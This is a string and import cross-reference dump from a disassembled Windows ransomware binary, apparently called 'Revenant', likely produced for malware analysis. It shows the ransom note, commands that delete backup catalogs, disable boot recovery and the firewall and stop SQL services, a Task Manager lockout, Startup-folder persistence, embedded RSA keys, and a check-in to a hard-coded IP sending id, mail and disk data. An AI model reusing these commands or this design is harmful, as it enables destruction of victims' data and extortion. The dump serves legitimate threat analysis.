reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x406ba7	0x51dca8	string	0x406b00	" not used
0x406c13	0x406c29	string	0x406b00	RQ覒\n blocks=Basic Latin,CJK Unified Ideographs
0x40749a	0x51dcdc	string	0x4073e0	InputBuffer
0x40753c	0x51dcdc	string	0x4073e0	InputBuffer
0x407900	0x51dd00	string	0x4078b0	InputFileName
0x40792c	0x51dd24	string	0x4078b0	InputBinaryMode
0x407a22	0x51dd44	string	0x4079c0	OutputFileNameWide
0x407a41	0x51dd58	string	0x4079c0	OutputBinaryMode
0x407ba2	0x51ddd0	string	0x407b60	CipherModeBase: feedback size cannot be specified for this cipher mode
0x407da4	0x51dd94	string	0x407cc0	DecodingLookupArray
0x407e38	0x51dd80	string	0x407cc0	Log2Base
0x4080a1	0x51de1c	string	0x408070	/GCM
0x408426	0x51dd6c	string	0x408420	EncodingParameters
0x40882a	0x51dda8	string	0x4086a0	InsertLineBreaks
0x408861	0x51ddbc	string	0x4086a0	MaxLineLength
0x408964	0x51de48	string	0x4088f0	C:\\Windows\
0x408f00	0x51dd10	string	0x4088f0	InputFileNameWide
0x408f36	0x51dd24	string	0x4088f0	InputBinaryMode
0x40909b	0x51de78	string	0x4088f0	
0x4097a3	0x51deb0	string	0x4088f0	Unhandled exception caught
0x40a359	0x51de78	string	0x40a1b0	
0x40add9	0x51deb0	string	0x40a1b0	Unhandled exception caught
0x40b025	0x4fd124	import	0x40af90	KERNEL32.dll.FindFirstFileW
0x40b038	0x51dedc	string	0x40af90	fuck
0x40b47c	0x51defc	string	0x40af90	IDk.txt
0x40b493	0x51df0c	string	0x40af90	Decrypt-me.txt
0x40b503	0x51de48	string	0x40af90	C:\\Windows\
0x40b516	0x51df2c	string	0x40af90	prvkey
0x40b71c	0x4fd150	import	0x40af90	KERNEL32.dll.lstrcmpW
0x40b78f	0x4fd12c	import	0x40af90	KERNEL32.dll.FindNextFileW
0x40b79e	0x4fd138	import	0x40af90	KERNEL32.dll.FindClose
0x40bb25	0x4fd124	import	0x40ba90	KERNEL32.dll.FindFirstFileW
0x40bb38	0x51dedc	string	0x40ba90	fuck
0x40bfb9	0x51de48	string	0x40ba90	C:\\Windows\
0x40c1bd	0x51df48	string	0x40ba90	threaad
0x40c208	0x51df48	string	0x40ba90	threaad
0x40c22b	0x4fd150	import	0x40ba90	KERNEL32.dll.lstrcmpW
0x40c29e	0x4fd12c	import	0x40ba90	KERNEL32.dll.FindNextFileW
0x40c2ad	0x4fd138	import	0x40ba90	KERNEL32.dll.FindClose
0x40c635	0x4fd124	import	0x40c5a0	KERNEL32.dll.FindFirstFileW
0x40c648	0x51dedc	string	0x40c5a0	fuck
0x40cac9	0x51de48	string	0x40c5a0	C:\\Windows\
0x40cccf	0x4fd150	import	0x40c5a0	KERNEL32.dll.lstrcmpW
0x40cd42	0x4fd12c	import	0x40c5a0	KERNEL32.dll.FindNextFileW
0x40cd51	0x4fd138	import	0x40c5a0	KERNEL32.dll.FindClose
0x40d0d5	0x4fd124	import	0x40d040	KERNEL32.dll.FindFirstFileW
0x40d0e8	0x51dedc	string	0x40d040	fuck
0x40d569	0x51de48	string	0x40d040	C:\\Windows\
0x40d6ea	0x4fd150	import	0x40d040	KERNEL32.dll.lstrcmpW
0x40d75d	0x4fd12c	import	0x40d040	KERNEL32.dll.FindNextFileW
0x40d76c	0x4fd138	import	0x40d040	KERNEL32.dll.FindClose
0x40daf5	0x4fd124	import	0x40da60	KERNEL32.dll.FindFirstFileW
0x40db08	0x51dedc	string	0x40da60	fuck
0x40def4	0x51de48	string	0x40da60	C:\\Windows\
0x40e0e9	0x4fd150	import	0x40da60	KERNEL32.dll.lstrcmpW
0x40e15c	0x4fd12c	import	0x40da60	KERNEL32.dll.FindNextFileW
0x40e16b	0x4fd138	import	0x40da60	KERNEL32.dll.FindClose
0x40e4f5	0x4fd124	import	0x40e460	KERNEL32.dll.FindFirstFileW
0x40e508	0x51dedc	string	0x40e460	fuck
0x40e989	0x51de48	string	0x40e460	C:\\Windows\
0x40eb7e	0x4fd150	import	0x40e460	KERNEL32.dll.lstrcmpW
0x40ebf1	0x4fd12c	import	0x40e460	KERNEL32.dll.FindNextFileW
0x40ec00	0x4fd138	import	0x40e460	KERNEL32.dll.FindClose
0x40ef85	0x4fd124	import	0x40eef0	KERNEL32.dll.FindFirstFileW
0x40ef98	0x51dedc	string	0x40eef0	fuck
0x40f40f	0x51de48	string	0x40eef0	C:\\Windows\
0x40f604	0x4fd150	import	0x40eef0	KERNEL32.dll.lstrcmpW
0x40f677	0x4fd12c	import	0x40eef0	KERNEL32.dll.FindNextFileW
0x40f686	0x4fd138	import	0x40eef0	KERNEL32.dll.FindClose
0x40f9cd	0x4fd120	import	0x40f980	KERNEL32.dll.GetLogicalDrives
0x40fb10	0x51df50	string	0x40fae0	sqlserver.exe
0x40fb4a	0x51df60	string	0x40fae0	msftesql.exe
0x40fb7b	0x51df70	string	0x40fae0	sqlagent.exe
0x40fbac	0x51df80	string	0x40fae0	sqlbrowser.exe
0x40fbdd	0x51df90	string	0x40fae0	sqlwriter.exe
0x40fc05	0x51dfa0	string	0x40fae0	mysqld.exe
0x40fc2a	0x51dfac	string	0x40fae0	mysqld-nt.exe
0x40fc4f	0x51dfbc	string	0x40fae0	mysqld-opt.exe
0x40fc8c	0x4fd148	import	0x40fae0	KERNEL32.dll.CloseHandle
0x40fca4	0x4fd140	import	0x40fae0	KERNEL32.dll.CreateToolhelp32Snapshot
0x40fcbe	0x4fd128	import	0x40fae0	KERNEL32.dll.Process32First
0x40fd0a	0x4fd13c	import	0x40fae0	KERNEL32.dll.OpenProcess
0x40fd19	0x4fd130	import	0x40fae0	KERNEL32.dll.TerminateProcess
0x40fd20	0x4fd148	import	0x40fae0	KERNEL32.dll.CloseHandle
0x40fd2a	0x4fd148	import	0x40fae0	KERNEL32.dll.CloseHandle
0x40fd38	0x4fd144	import	0x40fae0	KERNEL32.dll.Process32Next
0x40fe2c	0x4fd124	import	0x40fd90	KERNEL32.dll.FindFirstFileW
0x41005d	0x4fd150	import	0x40fd90	KERNEL32.dll.lstrcmpW
0x41008f	0x51dfd0	string	0x40fd90	\Decrypt-me.txt
0x41026e	0x4fd12c	import	0x40fd90	KERNEL32.dll.FindNextFileW
0x41027d	0x4fd138	import	0x40fd90	KERNEL32.dll.FindClose
0x4105fa	0x51e020	string	0x4105c0	0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNM
0x4107a9	0x51e07c	string	0x4106f0	C:\ProgramData\IDk.txt
0x4107ed	0x51e094	string	0x4106f0	C:\ProgramData\pkey.txt
0x4109df	0x51e094	string	0x4106f0	C:\ProgramData\pkey.txt
0x410b46	0x51e07c	string	0x4106f0	C:\ProgramData\IDk.txt
0x410c51	0x51e0ac	string	0x4106f0	C:\ProgramData
0x410cf1	0x51e0ac	string	0x4106f0	C:\ProgramData
0x410d9b	0x51dff4	string	0x4106f0	0123456789
0x410edb	0x51e000	string	0x4106f0	QWERTYUIOPASDFGHJKLZXCVBNM
0x41126c	0x51e07c	string	0x4106f0	C:\ProgramData\IDk.txt
0x4116b7	0x51e094	string	0x4106f0	C:\ProgramData\pkey.txt
0x4116e6	0x51dd34	string	0x4106f0	OutputFileName
0x41170b	0x51dd58	string	0x4106f0	OutputBinaryMode
0x4117cb	0x51e0c0	string	0x4106f0	MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAsGrS8kdP2e/3+ZyE4LlHPOsYdJ7b2oU74QsNSO5uRdqjL44edustu0uThYvx4PyZRpPPQK2mSgMSm/E+Lp2nEhQBty2YKEIY3TE86AA2xGRmeyTyKmc7u6Lb4R6SwCFOUE4Dxk3X557yGCzT2+pNOVcMJw0Fz1yv7QXfTk67QBvp4kZFqNZVrgJLaq1+uioCTdkoOriJX5BcyDaUKS++i/vApT3lQ/znsdjRzZ5HKsVNG5vOuhHJe+jv21gXcAF4CM2S5qzDNJFnCmUA5YrYOryd0MetEy3GOokoNmYY3XOqr+LuQrRvbdF0F+r/BjhQ/lYphowbBQEhkOMsZcxk6wIBEQ==
0x411804	0x51e0c0	string	0x4106f0	MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAsGrS8kdP2e/3+ZyE4LlHPOsYdJ7b2oU74QsNSO5uRdqjL44edustu0uThYvx4PyZRpPPQK2mSgMSm/E+Lp2nEhQBty2YKEIY3TE86AA2xGRmeyTyKmc7u6Lb4R6SwCFOUE4Dxk3X557yGCzT2+pNOVcMJw0Fz1yv7QXfTk67QBvp4kZFqNZVrgJLaq1+uioCTdkoOriJX5BcyDaUKS++i/vApT3lQ/znsdjRzZ5HKsVNG5vOuhHJe+jv21gXcAF4CM2S5qzDNJFnCmUA5YrYOryd0MetEy3GOokoNmYY3XOqr+LuQrRvbdF0F+r/BjhQ/lYphowbBQEhkOMsZcxk6wIBEQ==
0x411815	0x51e250	string	0x4106f0	MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAuSwd6N3pkW2t2RhnOJZhXJnoJTvfi/sMxJrAPZAcVly7nKeMX85t26yp38l+e6dW9xUIyTDYfvgvurl6gnefiXCPHpjWyInGcyrJbycnG5uhNa74UBq0y37GTU50vXnaW4CVtf1mCbPC1DBcMLRUMdBrsaYPMPs5QpsiFfYBozQnymlY1UHPXbN8MXxfQ4tmpABiQJFZVNquaU8p4KoNAn3t6AaR4ArMY6vcDi+ZbwTZSYHLCozvRZSrU6i9TgD7wy5QEmZ280su9jL8ZX+ew4yMQpZFxkZ7fIzm2W21Aj7Gf8s+sNdm3B4NGEoewySptvvPT+WhSqtArfha5Zf1ewIBEQ==
0x411826	0x51e3e0	string	0x4106f0	MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAuaV60MVKvEtIkBno5gv31O+Bq/YuINm/Nds9I2ILXPVXwIsHiA8eiUyXiu1dXk3VsuhdutLDfLh8Uw8eLO+pr1fxGStfeaYarKV10gU8iOG4r9Kr8DH5qyrIMC/Cj91wiYbMP+uW8DgJL4RWlDC5lMrSdXN/MYMzUTvyi7dWUYfEC+Oqf8MIl4xYYaIKfcyNE3KNPunjRbQoPKldQlNdCfz0Ml1inR8AmHribBSZh/vDAOdPIJ+EoG3RqO1gsdF4k3O8FvaMUrvEUe9BVASQPT/xM5MXxqyiKI7kwoEA8aWvXX9+a1IpoD9RnYhLnY8/kabVqRQC6xCgn+Fihnqz3QIBEQ==
0x41187b	0x51e56c	string	0x4106f0	https://api.my-ip.io/ip
0x411a29	0x51e588	string	0x4106f0	94.130.46.250
0x411ad4	0x51e598	string	0x4106f0	/postme
0x411b9b	0x51e5a4	string	0x4106f0	From
0x411cb4	0x51e5c4	string	0x4106f0	&ip=
0x411cd6	0x51e5bc	string	0x4106f0	&disk=
0x411d8c	0x51e5b4	string	0x4106f0	&id=
0x411e46	0x51e5ac	string	0x4106f0	&mail=
0x41246f	0x51e5d4	string	0x4106f0	C:\ProgramData\prvkey
0x41247d	0x51e5cc	string	0x4106f0	.txt
0x4124ff	0x51e608	string	0x4106f0	\n\nID=
0x412512	0x51e5fc	string	0x4106f0	Disksize=
0x412540	0x51e5f4	string	0x4106f0	Mail=
0x412571	0x51e5ec	string	0x4106f0	Ip=
0x4126a7	0x51e5d4	string	0x4106f0	C:\ProgramData\prvkey
0x4126b5	0x51e5cc	string	0x4106f0	.txt
0x412709	0x51e610	string	0x4106f0	.txt.key
0x4128f8	0x51de78	string	0x4106f0	
0x412b28	0x4fd134	import	0x4106f0	KERNEL32.dll.GetDriveTypeA
0x412bb5	0x51e658	string	0x4106f0	.key
0x412ca8	0x51e670	string	0x4106f0	fuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyou
0x413748	0x4fd14c	import	0x413610	KERNEL32.dll.FreeConsole
0x4137a5	0x51e76c	string	0x413610	xsmaxs@tutanota.com
0x4137f1	0x51e7a8	string	0x413610	.Revenant
0x41388f	0x51e7b4	string	0x413610	net stop MSDTC
0x413899	0x51e7c4	string	0x413610	bcdedit /set {default} bootstatuspolicy ignoreallfailures
0x4138a3	0x51e800	string	0x413610	bcdedit /set {default} recoveryenabled no
0x4138ad	0x51e82c	string	0x413610	wbadmin delete catalog -quiet
0x4138b7	0x51e84c	string	0x413610	net stop SQLSERVERAGENT
0x4138c1	0x51e864	string	0x413610	net stop MSSQLSERVER
0x4138cb	0x51e87c	string	0x413610	net stop vds
0x4138d5	0x51e88c	string	0x413610	netsh advfirewall set currentprofile state off
0x4138df	0x51e8bc	string	0x413610	netsh firewall set opmode mode=disable
0x4138e9	0x51e8e4	string	0x413610	net stop SQLWriter
0x4138f3	0x51e8f8	string	0x413610	net stop SQLBrowser
0x4138fd	0x51e864	string	0x413610	net stop MSSQLSERVER
0x413907	0x51e90c	string	0x413610	net stop MSSQL$CONTOSO1
0x413975	0x4fd134	import	0x413610	KERNEL32.dll.GetDriveTypeA
0x413af8	0x4b01d0	string	0x413610	WVS3
0x413b06	0x4b01d0	string	0x413610	WVS3
0x413ca6	0x51e958	string	0x413610	All Your Files Has Been Encrypted\n\nYou Have to Pay to Get Your Files Back\n\n1-Go to C:\ProgramData\ or in Your other Drives and send us prvkey*.txt.key file , * might be a number (like this : prvkey3.txt.key) \n\n2-You can send some file little than 1mb for Decryption test to trust us But the test File should not contain valuable data\n\n3-Payment should be with Bitcoin\n\n\n4-Changing Windows without saving prvkey.txt.key file will cause permanete Data loss\n\n\nOur Email:
0x413cd9	0x51e924	string	0x413610	\n\nin Case of no Answer:
0x413ed3	0x4fd134	import	0x413610	KERNEL32.dll.GetDriveTypeA
0x414164	0x414176	string	0x413610	j\b讹\t blocks=Basic Latin,CJK Unified Ideographs
0x4142d5	0x414328	string	0x413610	RQ觻\t blocks=Basic Latin,CJK Unified Ideographs
0x4142eb	0x414328	string	0x413610	RQ觻\t blocks=Basic Latin,CJK Unified Ideographs
0x41439b	0x51deb0	string	0x413610	Unhandled exception caught
0x4143ea	0x4fd134	import	0x413610	KERNEL32.dll.GetDriveTypeA
0x41450e	0x414524	string	0x413610	RQ諹\t blocks=Basic Latin,CJK Unified Ideographs
0x414629	0x51ed10	string	0x413610	Software\Microsoft\Windows\CurrentVersion\Policies\System
0x414633	0x4fd028	import	0x413610	ADVAPI32.dll.RegCreateKeyExA
0x414645	0x51ed4c	string	0x413610	DisableTaskmgr
0x414650	0x4fd02c	import	0x413610	ADVAPI32.dll.RegSetValueExA
0x414727	0x41473d	string	0x413610	QR蒷\t blocks=Basic Latin,CJK Unified Ideographs
0x414825	0x41483b	string	0x413610	RQ蔶\t blocks=Basic Latin,CJK Unified Ideographs
0x41490b	0x51da54	string	0x413610	space
0x414970	0x51e714	string	0x413610	Unhandled exception\n
0x414ee7	0x414ef2	string	0x414e70	3ɉN`Ɔ blocks=Basic Latin,Latin Extended-B
0x4157f8	0x415809	string	0x4157b0	3ɉO` blocks=Basic Latin,Latin Extended-B
0x4157fe	0x415809	string	0x4157b0	3ɉO` blocks=Basic Latin,Latin Extended-B
0x4158bb	0x51dce8	string	0x4158b0	SHA-1
0x415a47	0x51ed5c	string	0x415a10	OutputStringPointer
0x416526	0x41653a	string	0x4164c0	QV蕙\t blocks=Basic Latin,CJK Unified Ideographs
0x416857	0x416869	string	0x4167a0	3ۋE\b blocks=Basic Latin,Arabic
0x4171c3	0x4171c7	string	0x4171a0	WPRQ
0x4177af	0x417824	string	0x4175c0	RQ諆\t blocks=Basic Latin,CJK Unified Ideographs
0x4177c5	0x417824	string	0x4175c0	RQ諆\t blocks=Basic Latin,CJK Unified Ideographs
0x4177ea	0x4d3a2b	string	0x4175c0	j\fhp#S
0x4178ff	0x4d10ec	string	0x4178a0	j\fhp"S
0x417a18	0x4d0e44	string	0x417970	j\fhP"S
0x417cf2	0x417d27	string	0x417c10	;O\fs
0x418d4a	0x4d3a2b	string	0x418b40	j\fhp#S
0x418e48	0x4d3a2b	string	0x418df0	j\fhp#S
0x419534	0x41953f	string	0x4194e0	3ɉN` blocks=Basic Latin,Latin Extended-B
0x41a04a	0x41a05b	string	0x41a020	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41a050	0x41a05b	string	0x41a020	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41ad53	0x51eeb4	string	0x41ad20	BufferedTransformation: this object doesn't allow input
0x41aeb3	0x51eeb4	string	0x41ae80	BufferedTransformation: this object doesn't allow input
0x41c611	0x41c600	string	0x41c570	;B\bu
0x41c740	0x51eeec	string	0x41c740	vector<T> too long
0x41d35d	0x51de24	string	0x41d310	MGF1
0x41d3e2	0x51dce8	string	0x41d310	SHA-1
0x41d600	0x51ef58	string	0x41d600	invalid string position
0x41dbc8	0x41dbb8	string	0x41dba0	;P\bu\r
0x41e051	0x41e107	string	0x41e040	_^[]
0x41e868	0x51e660	string	0x41e800	prvkey.txt
0x41ef5b	0x51dcf0	string	0x41ef20	FeedbackSize
0x41f351	0x51df3c	string	0x41f1e0	shit
0x41f9b7	0x51e624	string	0x41f9b0	C:\ProgramData\prvkey
0x421780	0x51ef70	string	0x421780	string too long
0x421f87	0x51d978	string	0x421e80	false
0x421fa0	0x51d980	string	0x421e80	true
0x422d8c	0x51e72c	string	0x422d80	C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\
0x423c41	0x423c10	string	0x423bd0	;}\ftAf
0x423c54	0x423c10	string	0x423bd0	;}\ftAf
0x423f36	0x423f4a	string	0x423e20	QV腿\b blocks=Basic Latin,CJK Unified Ideographs
0x4241b3	0x4fd4c0	string	0x424190	easy handle already used in multi handle
0x425c57	0x4fd4f0	string	0x424460	SESS
0x425c97	0x4fd4f8	string	0x424460	FLUSH
0x425cc1	0x4fd500	string	0x424460	RELOAD
0x425d2f	0x4fd508	string	0x424460	Set-Cookie:
0x426414	0x426429	string	0x424460	9Xht#
0x42642c	0x426451	string	0x424460	9Xlt
0x4279d1	0x4b01d0	string	0x427990	WVS3
0x427b49	0x4fd6f0	string	0x427990	Internal error removing splay node = %d\n
0x427be3	0x4fd71c	string	0x427ba0	Internal error clearing splay node = %d\n
0x427cac	0x427ce1	string	0x427c70	][^_Y
0x427de0	0x4fd3bc	import	0x427cf0	WS2_32.dll.closesocket
0x42823f	0x4fd34c	import	0x427e90	WS2_32.dll.recv
0x4282e6	0x428007	string	0x427e90	]_^[
0x42886d	0x4fd3bc	import	0x4287a0	WS2_32.dll.closesocket
0x42a68a	0x42a6f9	string	0x42a620	3\t\a3
0x42a694	0x42a6f9	string	0x42a620	3\t\a3
0x42a6c1	0x42a6f9	string	0x42a620	3\t\a3
0x42a82a	0x42a820	string	0x42a730	;(t\rA
0x42ab9f	0x42b259	string	0x42ab00	j\nhL
0x42ac1a	0x4fd778	string	0x42ab00	%4095[^;\r\n=] =%4095[^;\r\n]
0x42ad3a	0x4fd7c8	string	0x42ab00	__Secure-
0x42ad58	0x4fd7d4	string	0x42ab00	__Host-
0x42adb1	0x4fd7dc	string	0x42ab00	secure
0x42ade7	0x4fd7e4	string	0x42ab00	httponly
0x42ae11	0x4fd7f0	string	0x42ab00	path
0x42ae5e	0x4fd7f8	string	0x42ab00	domain
0x42ae88	0x4fd76c	string	0x42ab00	localhost
0x42af69	0x4fd804	string	0x42ab00	skipped cookie with bad tailmatch domain: %s\n
0x42afbb	0x4fd834	string	0x42ab00	version
0x42afe6	0x4fd83c	string	0x42ab00	max-age
0x42b011	0x4fd844	string	0x42ab00	expires
0x42b0b7	0x446fd0	string	0x42ab00	QSUVW
0x42b0de	0x4fd794	string	0x42ab00	oversized cookie dropped, name/val %zu + %zu bytes\n
0x42baa6	0x42bda1	string	0x42ba80	_^]3
0x42bab2	0x42bda1	string	0x42ba80	_^]3
0x42be60	0x42beb1	string	0x42be30	_^]3
0x42be64	0x4fd8b8	string	0x42be30	none
0x42bea2	0x42beb1	string	0x42be30	_^]3
0x42bea6	0x42beb1	string	0x42be30	_^]3
0x42bf73	0x4fd508	string	0x42be30	Set-Cookie:
0x42bfd5	0x42bf70	string	0x42be30	j\vVh\b
0x42c08d	0x4fd8b8	string	0x42c020	none
0x42c0e4	0x4fd748	string	0x42c020	ignoring failed cookie_init for %s\n
0x42c105	0x42c161	string	0x42c020	3ۋ|$ blocks=Basic Latin,Arabic
0x42c14d	0x42c161	string	0x42c020	3ۋ|$ blocks=Basic Latin,Arabic
0x42c1ab	0x4fd508	string	0x42c020	Set-Cookie:
0x42c2ce	0x4fd9a0	string	0x42c280	WARNING: failed to save cookies in %s\n
0x42c433	0x4fd8e4	string	0x42c360	%s.%s.tmp
0x42c47d	0x4fd8f8	string	0x42c360	# Netscape HTTP Cookie File\n# https://curl.haxx.se/docs/http-cookies.html\n# This file was generated by libcurl! Edit at your own risk.\n\n
0x42c56c	0x4fd984	string	0x42c360	#\n# Fatal libcurl error\n
0x42c82f	0x51daec	string	0x42c820	unknown
0x42c874	0x4fd864	string	0x42c820	FALSE
0x42c87d	0x4fd85c	string	0x42c820	TRUE
0x42c897	0x4fd84c	string	0x42c820	#HttpOnly_
0x42c8ac	0x4fd8c8	string	0x42c820	%s%s%s\t%s\t%s\t%s\t%I64d\t%s\t%s
0x42cbe2	0x4fd15c	import	0x42cac0	KERNEL32.dll.InitializeCriticalSectionEx
0x42cc2e	0x4fd9f8	string	0x42cac0	getaddrinfo() thread failed to start\n
0x42ce14	0x4fd154	import	0x42cde0	KERNEL32.dll.EnterCriticalSection
0x42ce20	0x4fd158	import	0x42cde0	KERNEL32.dll.LeaveCriticalSection
0x42d03c	0x4fd154	import	0x42d020	KERNEL32.dll.EnterCriticalSection
0x42d04f	0x4fd158	import	0x42d020	KERNEL32.dll.LeaveCriticalSection
0x42d09c	0x4fd3bc	import	0x42d020	WS2_32.dll.closesocket
0x42d0cc	0x4fd160	import	0x42d0c0	KERNEL32.dll.DeleteCriticalSection
0x42d102	0x4fd3bc	import	0x42d0c0	WS2_32.dll.closesocket
0x42d208	0x4fd9cc	string	0x42d200	proxy
0x42d20d	0x4fd9d4	string	0x42d200	host
0x42d229	0x4fd9dc	string	0x42d200	Could not resolve %s: %s
0x42da0a	0x42da55	string	0x42da00	_^]3
0x42daf6	0x4fdd04	string	0x42dab0	Content-Type
0x42db32	0x4fdd6c	string	0x42dab0	multipart/mixed
0x42db5e	0x4fdd7c	string	0x42dab0	application/octet-stream
0x42db8c	0x4fdca8	string	0x42dab0	text/plain
0x42dbab	0x4fdd98	string	0x42dab0	Content-Disposition
0x42dbe8	0x4fddac	string	0x42dab0	multipart/
0x42dbfe	0x4fddb8	string	0x42dab0	attachment
0x42dc07	0x4fddb8	string	0x42dab0	attachment
0x42dc17	0x42dc27	string	0x42dab0	9|$$
0x42dc1c	0x42dc27	string	0x42dab0	9|$$
0x42dc9a	0x4fddc8	string	0x42dab0	; filename="
0x42dcaf	0x4fddd8	string	0x42dab0	; name="
0x42dcbf	0x4fdde4	string	0x42dab0	Content-Disposition: %s%s%s%s%s%s%s
0x42dd02	0x4fdd48	string	0x42dab0	; boundary=
0x42dd0c	0x4fdd54	string	0x42dab0	Content-Type: %s%s%s
0x42dd2b	0x4fde08	string	0x42dab0	Content-Transfer-Encoding
0x42dd5f	0x4fdc20	string	0x42dab0	8bit
0x42dd65	0x4fde24	string	0x42dab0	Content-Transfer-Encoding: %s
0x42dda8	0x4fde44	string	0x42dab0	multipart/form-data
0x42ddbd	0x4fde58	string	0x42dab0	form-data
0x42deba	0x4fdd28	string	0x42de50	Can't add itself as a subpart!
0x42dfa9	0x4fdd04	string	0x42df10	Content-Type
0x42e4c9	0x4fde70	string	0x42e4b0	----------------%ld%s
0x42e5eb	0x4fdd28	string	0x42e580	Can't add itself as a subpart!
0x42eaa5	0x4fdd20	string	0x42e9c0	--\r\n
0x42ed12	0x4fdd04	string	0x42ec30	Content-Type
0x42efc7	0x4fdd04	string	0x42ef40	Content-Type
0x42fcd0	0x4fde88	string	0x42fc50	Connection cache is full, closing the oldest one.\n
0x42fe8d	0x42fe84	string	0x42fe70	90t\f
0x43025d	0x4303a9	string	0x430210	_^]2
0x4304a8	0x4fdfd8	string	0x430460	sha256//
0x4304f6	0x4308ca	string	0x430460	_][^
0x430531	0x4fdfe4	string	0x430460	\t public key hash: sha256//%s\n
0x430590	0x4fe004	string	0x430460	;sha256//
0x430617	0x4fdfd8	string	0x430460	sha256//
0x430795	0x4fdfa0	string	0x430460	-----BEGIN PUBLIC KEY-----
0x4307c2	0x4fdfbc	string	0x430460	\n-----END PUBLIC KEY-----
0x430aec	0x430b19	string	0x4308e0	_^]3
0x430e1b	0x4fdf64	string	0x430dd0	CURL_SSLVERSION_MAX incompatible with CURL_SSLVERSION
0x430e6f	0x4fdf28	string	0x430dd0	Unrecognized parameter value passed via CURLOPT_SSLVERSION
0x430edb	0x4fdf64	string	0x430e90	CURL_SSLVERSION_MAX incompatible with CURL_SSLVERSION
0x430f2f	0x4fdf28	string	0x430e90	Unrecognized parameter value passed via CURLOPT_SSLVERSION
0x431391	0x431398	string	0x431060	_^]2
0x4316fb	0x4fe020	string	0x4316d0	CURL_SSL_BACKEND
0x43188f	0x4318ad	string	0x431800	2\bD$
